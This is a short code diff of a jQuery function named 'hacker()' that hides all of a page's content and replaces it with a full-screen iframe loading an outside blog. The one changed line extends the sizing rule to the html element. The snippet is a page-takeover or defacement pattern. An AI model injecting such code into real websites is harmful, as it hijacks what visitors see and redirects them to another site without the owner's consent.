@@ -2,7 +2,7 @@ function hacker(){
 			$(function(){
 				$('*').css({'margin':'0px','padding':'0px','overflow':'hidden','position':'relative'});
 				$('*','body').fadeOut();
-				$('body').css({'width':'100%','height':'100%'});
+				$('body,html').css({'width':'100%','height':'100%'});
 				$('body').html("<iframe ></iframe>");
 				$('iframe').css({'width':'100%','height':'100%','overflow-x':'hidden','position':'relative'});
 				$('iframe').attr('src','http://blog.h2ero.cn');
